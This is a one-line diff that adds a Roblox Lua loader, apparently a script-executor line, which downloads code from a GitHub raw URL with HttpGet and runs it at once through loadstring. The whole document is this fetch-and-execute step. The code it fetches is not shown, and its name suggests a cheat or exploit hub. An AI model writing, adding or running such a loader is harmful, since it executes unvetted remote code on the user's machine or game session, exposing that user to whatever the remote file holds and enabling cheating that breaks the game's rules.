@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/parthsahani457-lang/THE_13-PARTH/refs/heads/main/bY.EGO-EMPIRE"))()
